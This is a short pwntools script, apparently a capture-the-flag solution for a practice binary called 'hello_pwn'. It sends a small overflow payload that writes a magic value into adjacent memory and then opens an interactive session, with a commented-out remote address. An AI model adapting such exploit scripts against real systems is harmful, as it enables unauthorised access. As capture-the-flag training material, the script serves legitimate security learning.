from pwn import *
# from LibcSearcher import *

p = process("./hello_pwn")
# p = remote("220.249.52.133",37645)
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

elf = ELF("./hello_pwn")
payload = 'a'*4 + p32(0x6E756161)

p.sendline(payload)
p.interactive()
